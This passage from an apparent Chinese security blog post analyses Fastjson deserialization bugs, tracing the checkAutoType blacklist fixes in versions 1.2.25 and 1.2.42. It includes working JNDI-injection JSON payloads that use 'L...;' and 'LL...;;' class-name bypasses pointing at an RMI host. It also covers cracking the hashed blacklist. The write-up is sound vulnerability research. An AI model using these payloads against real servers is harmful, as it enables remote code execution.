&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       FieldDeserializer fieldDeserializer = getFieldDeserializer(key);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (fieldDeserializer == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">boolean</span> startsWithIs = key.startsWith(<span class="string">"is"</span>);</span><br><span class="line">           ...</span><br><span class="line">               <span class="comment">//以下省略了对于is开头的字段的一些判断逻辑。</span></span><br><span class="line">               <span class="comment">//好像满足了一定条件，会去跟对应的符合getter，settger的方法名匹配。</span></span><br><span class="line">               <span class="comment">//好像又回到is方法可以调用不了，但是真的脑壳疼，漏洞关键也不在于此，就不纠结了。</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//遍历我们输入的key的每一个字符，匹配第一个-或_替换为空</span></span><br><span class="line">       <span class="keyword">if</span> (fieldDeserializer == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">boolean</span> snakeOrkebab = <span class="keyword">false</span>;</span><br><span class="line">           String key2 = <span class="keyword">null</span>;</span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; key.length(); ++i) &#123;</span><br><span class="line">               <span class="keyword">char</span> ch = key.charAt(i);</span><br><span class="line">               <span class="keyword">if</span> (ch == <span class="string">'_'</span>) &#123;</span><br><span class="line">                   snakeOrkebab = <span class="keyword">true</span>;</span><br><span class="line">                   key2 = key.replaceAll(<span class="string">"_"</span>, <span class="string">""</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">'-'</span>) &#123;</span><br><span class="line">                   snakeOrkebab = <span class="keyword">true</span>;</span><br><span class="line">                   key2 = key.replaceAll(<span class="string">"-"</span>, <span class="string">""</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">        <span class="comment">//接下来根据替换后的key2，去寻找对应符合getter，setter的方法名进行匹配。</span></span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae23khmmfj328l12jguc.jpg" alt="_output ok.png"></p><p>然后在赋值的时候完美触发getoutputProperties方法。</p><p><code>com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(java.lang.Object, java.lang.Object)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(Object object, Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">null</span> <span class="comment">//</span></span><br><span class="line">            &amp;&amp; fieldInfo.fieldClass.isPrimitive()) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Method method = fieldInfo.method;</span><br><span class="line">            <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">                    <span class="comment">//判断特殊类型</span></span><br><span class="line">                    ...</span><br><span class="line">                    <span class="comment">//进入getoutputProperties方法的返回值是Properties符合该一项（之前说过）</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(method.getReturnType())) &#123;</span><br><span class="line">                    <span class="comment">//进入调用，object是我们的恶意TemplatesImpl类</span></span><br><span class="line">                        Map map = (Map) method.invoke(object);</span><br></pre></td></tr></table></figure><p>那么以上流程就是<code>_getOutputProperties</code>字段 =&gt; <code>getOutputProperties</code>方法具体演变的细节。那么以上分析结果也让我们知道加个骚气的小杠<code>-</code>应该也是可以的。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae23atakrj31yj0wl49q.jpg" alt="-output 也可以.png"></p><p>至此就完成了在知道Templates触发类原理的情况下，变形衍生到了fastjson中完成RCE。</p><blockquote><p>至于Templates恶意类的第二个触发点，xalan 2.7.2的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，在JDK反序列化Gadgets7u21一文中有补充说明，这里就不多说了。</p></blockquote><h2 id="Fastjson抗争的一生"><a href="#Fastjson抗争的一生" class="headerlink" title="Fastjson抗争的一生"></a>Fastjson抗争的一生</h2><p>在讲述完最开始引发漏洞的1.2.24版本之后，其实接下来的部分才是开起此篇的初衷。但是因为基础实在是差+懒，直到现在才开始正文。</p><h3 id="1-2-24漏洞版本修复"><a href="#1-2-24漏洞版本修复" class="headerlink" title="1.2.24漏洞版本修复"></a>1.2.24漏洞版本修复</h3><p>在1.2.25版本，针对1.2.24版本进行了修复。</p><p>我们可以总结以下1.2.24版本的漏洞产生原因：</p><ol><li><code>@type</code>该关键词的特性会加载任意类，并给提供的输入字段的值进行恢复，如果字段有setter、getter方法会自动调用该方法，进行赋值，恢复出整个类。<br>这个过程会被叫做fastjson的反序列化过程，注意不要把这个过程跟java反序列化过程混为一谈。它们两个是同等级的存在，而不是前者基于后者之上。也就是说readObject()反序列化利用点那一套在这根本不适用。相应的@type加载任意类+符合条件的setter与getter变成了反序列化利用点（个人总结的三要素中的反序列化漏洞触发点）。</li><li>在找到可以调用的setter、getter之后，从这个可以被出发的setter、getter之后就可以沿着不同的反序列化利用链前进，比如具有一定限制条件的TemplatesImpl利用链，JNDI注入的利用链。（个人总结三要素中的反序列化利用链）</li><li>沿着链就会到最后的payload触发点。比如JNDI的远程恶意class文件的实例化操作（构造函数，静态方法）或调用类中getObjectInstance方法，与TemplatesImpl利用链中的class文件字节码的的实例化操作（构造函数，静态方法）（个人总结三要素中的反序列化payload触发点）</li></ol><blockquote><p>可以注意到最终的payload触发点具有好像是巧合的统一性，都类似于是一个class文件的实例化操作。在commons-collections中则是反射机制（这在@type中的getter、setter函数调用中也被用到）。我们应该对这两个点产生敏感性。</p></blockquote><p>修复则是针对三要素中的一者进行截断。在1.2.25中的修复原理就是针对了反序列化漏洞触发点进行限制。对于<code>@type</code>标签进行一个白名单+黑名单的限制机制。</p><p>使用万能的idea对两个版本的jar包进行对比</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae22z6chbj32bc0qx41t.jpg" alt="修复1.2.24.png"></p><p>可以注意到，在解析json串的<code>DefaultJSONParser类</code>中做了一行代码的修改。当输入的键值是<code>@type</code>时，原本直接对值对应的类进行加载。现在会将值ref传入<code>checkAutoType方法</code>中。</p><p>checkAutoType是1.2.25版本中新增的一个白名单+黑名单机制。同时引入一个配置参数<code>AutoTypeSupport</code>。参考<a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">官方wiki</a></p><p>Fastjson默认AutoTypeSupport为False（开启白名单机制），通过需要服务端通过以下代码来显性修改。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true); （关闭白名单机制）</span><br></pre></td></tr></table></figure><p>由于checkAutoType中两条路线的代码是穿插的，我们先来看默认<code>AutoTypeSupport为False</code>时的代码。</p><p><code>1.2.25版本com.alibaba.fastjson.parser.ParserConfig#checkAutoType(开启白名单机制)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//一些固定类型的判断，此处不会对clazz进行赋值，此处省略</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="comment">//进行黑名单匹配，匹配中，直接报错退出</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny = denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//对白名单，进行匹配；如果匹配中，调用loadClass加载，赋值clazz直接返回</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept = acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="comment">//此处省略了当clazz不为null时的处理情况，与expectClass有关</span></span><br><span class="line">    <span class="comment">//但是我们这里输入固定是null，不执行此处代码</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//可以发现如果上面没有触发黑名单，返回，也没有触发白名单匹配中的话，就会在此处被拦截报错返回。</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//执行不到此处</span></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以得出在默认的<code>AutoTypeSupport为False</code>时，要求不匹配到黑名单，同时必须匹配到白名单的class才可以成功加载。</p><p>看一下默认黑名单，默认白名单（最下面，默认为空）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae22owggwj30q80s1jt6.jpg" alt="修复1.2.24黑名单.png"></p><p>这条路完全被白名单堵死了,所以默认的情况下是不可能绕过的。我们的两个payload也都被com.sun这一条黑名单给匹配了。</p><h3 id="1-2-25-1-2-41绕过"><a href="#1-2-25-1-2-41绕过" class="headerlink" title="1.2.25-1.2.41绕过"></a>1.2.25-1.2.41绕过</h3><p>所以接下来所谓的绕过都是在服务端显性开启<code>AutoTypeSupport为True</code>的情况下进行的。（这是一个很大的限制条件）</p><p>我们先来看显性修改<code>AutoTypeSupport为True</code>时的代码：</p><p><code>1.2.25版本com.alibaba.fastjson.parser.ParserConfig#checkAutoType(关闭白名单机制)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//先进行白名单匹配，如果匹配成功则直接返回。可见所谓的关闭白名单机制是不只限于白名单</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept = acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">   <span class="comment">//同样进行黑名单匹配，如果匹配成功，则报错推出。</span></span><br><span class="line">            <span class="comment">//需要注意这百年所谓的匹配都是startsWith开头匹配</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny = denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//一些固定类型的判断，不会对clazz进行赋值，此处省略</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//不匹配白名单中也不匹配黑名单的，进入此处，进行class加载</span></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//对于加载的类进行危险性判断，判断加载的clazz是否继承自Classloader与DataSource</span></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">                    || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">                    ) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//返回加载的class</span></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见在显性关闭白名单的情况下，我们也需要绕过黑名单检测，同时加载的类不能继承自Classloader与DataSource。</p><p>看似我们只能找到其他的利用类跟黑名单进行硬刚。但我们再跟一下类的加载<code>TypeUtils.loadClass</code>就会有所发现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//特殊处理1！</span></span><br><span class="line">        <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">'['</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//特殊处理2！</span></span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>)) &#123;</span><br><span class="line">            String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><ul><li><p>如果这个className是以<code>[</code>开头我们会去掉<code>[</code>进行加载！</p><p>但是实际上在代码中也可以看见它会返回Array的实例变成数组。在实际中它远远不会执行到这一步，在json串解析时就已经报错。</p></li><li><p>如果这个className是以<code>L</code>开头<code>;</code>结尾，就会去掉开头和结尾进行加载！</p></li></ul><p>那么加上<code>L</code>开头<code>;</code>结尾实际上就可以绕过所有黑名单。那么理所当然的payload就为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//1.2.25-41绕过 jndi ldap</span><br><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.RowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br><span class="line">//1.2.25-41绕过 7u21</span><br><span class="line">同样加上L;，payload太长了且不唯一，就不写了</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae22edebfj326g15vtmt.jpg" alt="1.2.25-jndi-计算器.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae228422cj323s12utl9.jpg" alt="1.2.41-jndi-计算器.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae22090njj31yh16gn9j.jpg" alt="1.2.41-7u21-计算器.png"></p><h3 id="1-2-42版本修复"><a href="#1-2-42版本修复" class="headerlink" title="1.2.42版本修复"></a>1.2.42版本修复</h3><p>在1.2.42中对于1.2.41版本进行了修复，对于两个jar进行对比可以发现<code>DefaultJSONParser.java</code>没有什么关键的修改。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae21szagqj32bc0y5430.jpg" alt="1.41-1.42比较.png"></p><p>关键是在<code>ParserConfig.java</code>中修改了以下两点：</p><ol><li>修改明文黑名单为黑名单hash</li><li>对于传入的类名，删除开头<code>L</code>和结尾的<code>;</code></li></ol><p>黑名单大致形式如下：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae21hu6b9j30gf0cxq3f.jpg" alt="1.2.42黑名单hash.png"></p><p>虽然说利用hash可以让我们不知道禁用了什么类，但是加密方式是有写<code>com.alibaba.fastjson.parser.ParserConfig#addDeny</code>中的<code>com.alibaba.fastjson.util.TypeUtils#fnv1a_64</code>，我们理论上可以遍历jar，字符串，类去碰撞得到这个hash的值。（因为常用的包是有限的）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">fnv1a_64</span><span class="params">(String key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">long</span> hashCode = <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; key.length(); ++i)&#123;</span><br><span class="line">            <span class="keyword">char</span> ch = key.charAt(i);</span><br><span class="line">            hashCode ^= ch;</span><br><span class="line">            hashCode *= <span class="number">0x100000001b3L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//可以注意到，计算hash是遍历每一位进行固定的异或和乘法运算进行累积运算</span></span><br></pre></td></tr></table></figure><p>有一个<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">Github项目</a>就是完成了这样的事情，并列出了目前已经得到的hash。</p><p>再是对于传入的类名，删除开头<code>L</code>和结尾的<code>;</code>。</p><p><code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">// hash算法常量</span></span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">long</span> BASIC = <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">long</span> PRIME = <span class="number">0x100000001b3L</span>;</span><br><span class="line"><span class="comment">// 对传入类名的第一位和最后一位做了hash，如果是L开头，;结尾，删去开头结尾</span></span><br><span class="line"><span class="comment">// 可以发现这边只进行了一次删除</span></span><br><span class="line">      <span class="keyword">if</span> ((((BASIC</span><br><span class="line">              ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">              * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">// 计算处理后的类名的前三个字符的hash</span></span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">long</span> h3 = (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">              * PRIME;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="keyword">long</span> hash = h3;</span><br><span class="line">          <span class="comment">//基于前三个字符的hash结果继续进行hash运算</span></span><br><span class="line">          <span class="comment">//这边一位一位运算比较其实就相当于之前的startswith，开头匹配</span></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">              hash ^= className.charAt(i);</span><br><span class="line">              hash *= PRIME;</span><br><span class="line">              <span class="comment">//将运算结果跟白名单做比对</span></span><br><span class="line">              <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                  clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                  <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                      <span class="keyword">return</span> clazz;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">//将运算结果跟黑名单做比对</span></span><br><span class="line">              <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//之后就是一样的处理，根据类名加载类</span></span><br></pre></td></tr></table></figure><p>确实有效的干掉了L开头；结尾的payload。</p><h3 id="1-2-42绕过"><a href="#1-2-42绕过" class="headerlink" title="1.2.42绕过"></a>1.2.42绕过</h3><p>但是可以发现在以上的处理中，只删除了一次开头的<code>L</code>和结尾的<code>;</code>，这里就好像使用黑名单预防SQL注入，只删除了一次敏感词汇的防御错误一样，重复一下就可以被轻易的绕过。所以payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//1.2.42绕过 jndi ldap</span><br><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.RowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br><span class="line">//1.2.42绕过 7u21</span><br><span class="line">同样加上LL ;;，payload太长了且不唯一，就不写了</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae20ylpp2j31qk0m27b7.jpg" alt="1.2.42-绕过jndi-计算器.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae216919uj31rr0u5wo1.jpg" alt="1.2.42绕过7u21-计算器.png"></p><h3 id="1-2-43版本修复"><a href="#1-2-43版本修复" class="headerlink" title="1.2.43版本修复"></a>1.2.43版本修复</h3><p>在1.2.43中对于1.2.42版本可绕过的情况进行了修复。</p><p>修改了<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code>的部分代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 